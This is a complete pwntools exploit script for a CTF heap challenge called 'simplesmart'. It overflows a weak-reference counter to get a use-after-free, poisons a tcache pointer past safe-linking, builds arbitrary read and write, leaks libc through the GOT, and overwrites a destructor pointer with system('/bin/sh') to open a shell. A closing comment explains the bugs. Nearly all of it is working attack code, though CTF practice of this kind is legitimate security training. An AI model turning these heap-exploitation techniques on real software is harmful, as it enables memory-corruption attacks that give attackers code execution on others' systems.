#!/usr/bin/env python3
from pwn import *
import os, re, sys, time

HOST = 'simplesmart.challs.ctf.bhackari.it'
PORT = 5003

BIN = './simplesmart_patched'
LIBC = './libc.so.6'
LD = './ld-2.39.so'

context.binary = exe = ELF(BIN, checksec=False)
libc = ELF(LIBC, checksec=False)
context.log_level = 'debug' if args.DEBUG else 'info'
context.timeout = 5

A_CB_LOW      = 0xc0
A_PAYLOAD_LOW = 0xc0 + 0x30

GDB_SCRIPT = """
b main

"""

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(e.path, gdbscript=GDB_SCRIPT)

    return process([LD, '--library-path', '.', exe.path])


class utils:
    def __init__(self, io):
        self.io = io

    def menu(self):
        data = self.io.recvuntil(b'> ', timeout=10)
        if not data.endswith(b'> '):
            raise EOFError(f'menu sync failed, got: {data[-200:]!r}')
        return data

    def cmd(self, n):
        self.menu()
        self.io.sendline(str(n).encode())

    def create_strong(self, pos, size):
        self.cmd(1)
        self.io.recvuntil(b'pos: ')
        self.io.sendline(str(pos).encode())
        self.io.recvuntil(b'size: ')
        self.io.sendline(str(size).encode())

    def copy_strong(self, sid, pos):
        self.cmd(2)
        self.io.recvuntil(b'sid: ')
        self.io.sendline(str(sid).encode())
        self.io.recvuntil(b'pos: ')
        self.io.sendline(str(pos).encode())

    def release_strong(self, pos):
        self.cmd(3)
        self.io.recvuntil(b'pos: ')
        self.io.sendline(str(pos).encode())

    def create_weak(self, sid, pos):
        self.cmd(4)
        self.io.recvuntil(b'sid: ')
        self.io.sendline(str(sid).encode())
        self.io.recvuntil(b'pos: ')
        self.io.sendline(str(pos).encode())

    def release_weak(self, pos):
        self.cmd(5)
        self.io.recvuntil(b'pos: ')
        self.io.sendline(str(pos).encode())

    def info(self, typ, pos):
        self.cmd(6)
        self.io.recvuntil(b'type (1=strong / 2=weak): ')
        self.io.sendline(str(typ).encode())
        self.io.recvuntil(b'pos: ')
        self.io.sendline(str(pos).encode())
        line = self.io.recvline(timeout=5)
        m = re.search(rb'strong = (\d+);  weak = (\d+);  payload size = (\d+)', line)
        if not m:
            raise RuntimeError(f'bad metadata line: {line!r}')
        # order in show_metadata is cb[1], cb[0], cb[2].
        return tuple(map(int, m.groups()))

    def read_weak(self, pos, n):
        self.cmd(7)
        self.io.recvuntil(b'pos: ')
        self.io.sendline(str(pos).encode())
        return self.io.recvn(n, timeout=5)

    def write_strong(self, pos, data):
        self.cmd(8)
        self.io.recvuntil(b'pos: ')
        self.io.sendline(str(pos).encode())
        self.io.recvuntil(b'data: ')
        self.io.send(data)






def make_cb(weak=1, strong=1, size=8, dtor=0, payload=0):
    return flat({
        0x00: p8(weak & 0xff),
        0x01: p8(strong & 0xff),
        0x02: p8(size & 0xff),
        0x10: p64(dtor & 0xffffffffffffffff),
        0x18: p64(payload & 0xffffffffffffffff),
    }, length=0x20)


def build_self_overlap(s):
    s.create_strong(0, 0x20)  # A
    s.create_strong(1, 0x20)  # B

    log.info('ow byte so it wraps to 0')
    for i in range(255):
        s.create_weak(0, i)

    # i can free (release strong) even if there are still 255 weak ptrs allocated -> i have a dangling heap ptr
    # -> uaf on the control block

   
    log.info('releasing A')
    s.release_strong(0)

    shown_strong, shown_weak, shown_size = s.info(2, 0) # leak heap
    cur = shown_weak  # first field of the struct (cb[0]) => now it's the low byte of safe-linked tcache fd in freed A.cb

    # A.cb -> A.payload, we want A.cb pointing to itself so malloc will return the same chunk 2 times
    # (self overlap)
    want = cur ^ A_PAYLOAD_LOW ^ A_CB_LOW  # bypass safe linking

    log.info(f'freed A.cb: strong={shown_strong:#x} weak={shown_weak:#x} size={shown_size:#x}')
    log.info(f'wanted poisoned low byte: {want:#x}')

    # main checks cb[1] before weak_release; if zero, release_weak exits.
    if shown_strong == 0:
        raise ValueError('bad tcache byte')
    if want > cur:
        raise ValueError('bad low byte for poison')

    dec = cur - want
    if dec == 0:
        raise ValueError('dec=0')

    log.info(f'decrementing {dec} times')

    # i want to dec the fd until it becomes the addr i want!
    for wid in range(1, 1 + dec):
        s.release_weak(wid)

    after = s.info(2, 0)
    log.info(f'after poison fields: {after}')
    if after[1] != want:
        raise ValueError(f'poison failed: wanted cb0={want:#x}, got cb0={after[1]:#x}')

    # make_strong does: malloc control block -> old A.cb, malloc payload -> old A.cb.
    s.create_strong(2, 0x20)
    log.success('self-overlap achieved: strong[2].control_block == strong[2].payload')

    # weak[0] still points to old A.cb, now C.cb. 
    # so i can read the control block of C
    raw = s.read_weak(0, 0x20)
    payload_dtor = u64(raw[0x10:0x18])
    c_cb = u64(raw[0x18:0x20])

    exe.address = payload_dtor - exe.sym.payload_dtor
    b_cb = c_cb + 0x80 # (32 * 4) = offset block B

    log.success(f'payload_dtor = {payload_dtor:#x}')
    log.success(f'PIE base     = {exe.address:#x}')
    log.success(f'C.cb heap    = {c_cb:#x}')
    log.success(f'B.cb heap    = {b_cb:#x}')

    return c_cb, b_cb, 1


def solve():
    io = start()
    s = utils(io)
    try:

        # with write_strong i only write into strong->cb->payload
        # find a way to change the function called when the strong ptr is freed to system

        # self overlap a cb (C.cb->payload = C.cb) -> write_strong writes directly into C.cb
        c_cb, b_cb, b_wid = build_self_overlap(s)

        # C is self-overlapped
        # i overwrite C.cb with a fake struct editing C.cb->payload = B.cb -> i can fully control another control block!
        s.write_strong(2, make_cb(weak=1, strong=1, size=0x20,
                                  dtor=exe.sym.payload_dtor, payload=b_cb))

        # i need a libc leak
        # create a real weak pointer (with read_weak i have arb read)
        s.create_weak(1, b_wid)

        def set_b_cb(size=8, dtor=0, payload=0, weak=1, strong=1):
            # C->payload = B.cb -> use the write to overwrite B.control_block
            s.write_strong(2, make_cb(weak=weak, strong=strong, size=size,
                                      dtor=dtor, payload=payload))

        def arb_read(addr, size=8):
            set_b_cb(size=size, dtor=exe.sym.payload_dtor, payload=addr, weak=1, strong=1)
            return s.read_weak(b_wid, size)

        free_got = exe.got['free']
        log.info(f'free @ GOT = {free_got:#x}')

        # leak libc free by reading the got
        free_leak = u64(arb_read(free_got, 8).ljust(8, b'\x00'))
        if (free_leak >> 40) not in (0x7f, 0x7e):
            raise ValueError(f'bad libc free leak: {free_leak:#x}')

        libc.address = free_leak - libc.sym['free']
        system = libc.sym['system']
        binsh = next(libc.search(b'/bin/sh\x00'))

        log.success(f'free = {free_leak:#x}')
        log.success(f'libc = {libc.address:#x}')
        log.success(f'system = {system:#x}')

        # overwrite dtor with system and payload (= dtor arg) with binsh
        set_b_cb(size=8, dtor=system, payload=binsh, weak=1, strong=1)
        s.release_strong(1)

        io.sendline(b'id')
        try:
            data = io.recv(timeout=2)
        except Exception:
            pass
        io.interactive()
        return True

    except Exception as e:
        log.warning(str(e))
        io.close()
        return False


def main():
    log.info(f'payload_dtor offset: {exe.sym.payload_dtor:#x}')
    log.info(f'free offset: {exe.got["free"]:#x}')
    for attempt in range(2048):
        log.info(f'attempt {attempt}')
        if solve():
            return
    log.failure('failed')


if __name__ == '__main__':
    main()


""" 
A.cb:
+0x00 weak
+0x01 strong
+0x02 size
...
+0x10 dtor
+0x18 payload

bugs: dangling weak pointers (using the byte overflow)
when freed, weak pointers are decremented -> i can decrement as many times as i want the low fd pointer byte in the tcache chunk!
i need many tries because this fails if target > cur fd

when a strong ptr is freed, the function dtor is executed with args in payload.
with the uaf i can control those ptr since i have arb write

"""
